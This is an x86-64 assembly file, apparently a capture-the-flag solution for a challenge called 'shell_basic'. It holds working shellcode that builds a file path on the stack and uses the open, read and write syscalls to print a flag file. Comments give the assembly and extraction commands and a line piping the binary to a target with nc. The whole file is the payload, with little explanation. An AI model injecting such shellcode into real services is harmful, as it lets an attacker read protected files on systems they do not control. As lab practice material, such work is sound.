; File name: S4_05_shellcode.asm
; nasm -f elf64 S4_06_shell_basic.asm, elf: 32-bit, elf-64: 64-bit
; objdump -d S4_06_shell_basic.o
; objcopy --dump-section .text=S4_06_shell_basic.bin S4_06_shell_basic.o
; xxd S4_06_shell_basic.bin
; cat S4_06_shell_basic.bin | nc <host> <port>

section .text
global _start
_start:
push 0x0                    ; NULL
mov rax, 0x676e6f6f6f6f6f6f ; oooooong
push rax
mov rax, 0x6c5f73695f656d61 ; ame_is_l
push rax
mov rax, 0x6e5f67616c662f63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax
mov rdi, rsp    ; rdi = '/home/shell_basic/flag_name_is_loooooong'
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30  buf
mov rdx, 0x30     ; rdx = 0x30      len
mov rax, 0x0      ; rax = 0         syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 0x1      ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)

xor rdi, rdi      ; rdi = 0
mov rax, 0x3c     ; rax = sys_exit
syscall           ; exit(0)